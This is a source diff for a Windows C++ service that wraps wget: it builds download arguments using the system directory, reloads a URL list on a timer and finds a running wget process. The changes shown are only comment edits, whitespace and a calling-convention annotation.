@@ -46,8 +46,9 @@ ACTIVE_URL *aurl;	// array of active URLs
 int aurl_count;		// items count in array
 int aurl_undone;	// really active URLs
 
-// directories
+// system32 directory
 TCHAR sys_dir[MAX_PATH];
+
 
 
 DWORD __stdcall wait_for_downloading(LPVOID lp)
@@ -71,6 +72,7 @@ DWORD __stdcall wait_for_downloading(LPVOID lp)
 }
 
 
+// find process ID of already launched wget
 DWORD find_process_id()
 {
 	DWORD *pid = new DWORD [2048];
@@ -174,6 +176,8 @@ void __stdcall reload_url_list(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwT
 			for (i=0; i<line_len; i++)
 				url_itself[i] = (TCHAR)line[i];
 			url_itself[i] = 0;
+
+			// free decoded line
 			delete [] line;
 
 			// set new base and offset for the next line
@@ -239,14 +243,13 @@ void __stdcall reload_url_list(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwT
 
 	// close file
 	/////////////
-
 	UnmapViewOfFile(pMem);
 	CloseHandle(hMap);
 	CloseHandle(hf);
 }
 				  
 	 
-void wget_sv_main()
+void __stdcall wget_sv_main()
 {
 	// get system directory
 	SHGetFolderPath(0, CSIDL_SYSTEM, 0, 0, sys_dir);
@@ -265,11 +268,11 @@ void wget_sv_main()
 
 	// get full args string
 	WGET_ARGS = new TCHAR	[
-							_tcslen(WGET_DIR_PREFIX_FIRST) +
-							_tcslen(sys_dir) +
-							_tcslen(WGET_DIR_PREFIX_LAST) +
-							_tcslen(WGET_ARGS_LAST) +
-							1
+								_tcslen(WGET_DIR_PREFIX_FIRST) +
+								_tcslen(sys_dir) +
+								_tcslen(WGET_DIR_PREFIX_LAST) +
+								_tcslen(WGET_ARGS_LAST) +
+								1
 							];
 	WGET_ARGS[0] = 0;
 	_tcscat(WGET_ARGS, WGET_DIR_PREFIX_FIRST);
@@ -282,13 +285,14 @@ void wget_sv_main()
 	SetTimer(NULL, 0, URLS_TIME*1000, reload_url_list);
 
 
-	// Main message loop:
 	/*if (WaitForSingleObject(hEndEvent, lWait) != WAIT_TIMEOUT)
 		{
 			// Установлено сообщение hEndEvent, нужно завершать
 			// выполнение
 			break; 
 		}*/
+
+	// Main message loop:
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
